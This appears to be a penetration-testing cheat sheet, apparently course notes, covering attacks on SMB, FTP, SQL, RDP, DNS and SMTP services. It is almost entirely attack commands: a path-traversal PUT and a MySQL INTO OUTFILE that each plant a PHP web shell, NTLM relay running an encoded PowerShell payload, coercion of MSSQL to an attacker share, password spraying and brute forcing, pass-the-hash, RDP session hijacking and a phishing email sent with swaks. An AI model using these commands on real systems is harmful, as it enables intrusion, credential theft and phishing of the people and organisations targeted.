# Attacking Common Services

### Basics / SMB

```shell
  dir \\192.168.220.129\Finance\
  Get-ChildItem \\192.168.220.129\Finance\

  net use n: \\192.168.220.129\Finance
  New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

  Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

  curl -k -X PUT -H "Host: STMIP" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://STMIP/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php
  url -w "\n" http://STMIP/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
```

```shell
  #ssh
  echo "<ssh_key>" | sed 's/ /\n/g' > id_rsa
```
---

### FTP

```shell
  ftp 192.168.2.142
  medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
  nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

  dir
  prompt
  mget *
```

---

### SMB

```shell
  sudo nmap 10.129.14.128 -sV -sC -p139,4457

  ./enum4linux-ng.py 10.10.11.45 -A -C
  enum4linux 10.10.11.45

  msfconsole -q
  use auxiliary/scanner/smb/smb_login
  sudo cme smb 10.129.203.10 -u fiona -p passwd.list

  smbclient -N -L //10.129.14.128
  smbclient -N \\\\10.129.14.128\<share_name>
  smbclient -U jason //STMIP/GGJ
  
  smbmap -H 10.129.14.128
  smbmap -H 10.129.14.128 -r notes
  smbmap -H 10.129.14.128 --download "notes\note.txt"
  smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
  rpcclient -U'%' 10.10.110.17
  crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
  
  impacket-psexec administrator:'Password123!'@10.10.110.17
  crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
  crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
  crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --samm
  crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

  sudo responder -I <network_interface>
  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  cat /etc/responder/Responder.conf | grep 'SMB =' #SMB off

  impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
  impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64_encodedd_payload>' #revshells for payload
  
```

---

### SQL

```shell
  nmap -Pn -sV -sC -p1433 10.10.10.125

  mssqlclient.py -p 1433 julio@10.129.203.7 

  sudo responder -I tun0
  sudo impacket-smbserver share ./ -smb2support
  hashcat -m 5600

  mysql -u julio -pPassword123 -h 10.129.20.13  
  sqlcmd -S <ip> -U julio -P 'MyPassword!'
  
  sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
  sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

```shell
  #MSSQL
  EXEC master..xp_dirtree '\\<attacker_ip>\share' # Ensure impacket smbserver running

  SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

  SELECT srvname, isremote FROM sysservers
  
  sqlcmd -S 10.129.247.219 -U .\\mssqlsvc
  
  SELECT name FROM master.dbo.sysdatabases # always line 2 GO
  use <databse_name>
  SELECT table_name FROM <db_name>.INFORMATION_SCHEMA.TABLES
  xp_cmdshell 'whoami'
  GO #after each

```

```shell
  #mysql
  SHOW DATABASES;
  SHOW TABLES;
  SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
  show variables like "secure_file_priv";
  select LOAD_FILE("/etc/passwd");
```

---

### RDP

```shell
  nmap -Pn -p3389 192.168.2.143
  crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
  hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
  rdesktop -u admin -p password123 192.168.2.143
  xfreerdp /v:<ip> /u:<username> /p:<password>

  whhoami
  query user
  tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
  sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
  net start sessionhijack

  #pass the hash
  reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
  xfreerdp /v:192.168.220.152 /u:administrator /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

---

### DNS

```shell
  nmap -p53 -Pn -sV -sC 10.10.110.213
  dig AXFR inlanefreight.htb @<ip/domain>
  fierce --domain zonetransfer.me
  ./subfinder -d inlanefreight.com -v
  host support.inlanefreight.com

  cat /etc/ettercap/etter.dns


  git clone https://github.com/TheRook/subbrute.git && cd subbrute/
  echo <ip> > resolvers.txt
  python3 subbrute.py inlanefreight.htb -s /opt/useful/SecLists/Discovery/DNS/namelist.txt -r resolvers.txt
  
```

---

### SMTP

```shell
  host -t MX hackthebox.eu
  dig mx plaintext.do | grep "MX" | grep -v ";"
  host -t A mail1.inlanefreight.htb.
  
  smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
  python3 o365spray.py --validate --domain msplaintext.xyz
  python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz  
  sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

  hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
  python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
  nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
  swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
  

  telnet 10.10.110.20 25
  VRFY root #find valid usernames
  EXPN john #like VRFY
  RCPT TO:julio  #recipient to
```

```shell
  #Pop3
  telnet 10.10.110.20 110
  USER john
  
``` 
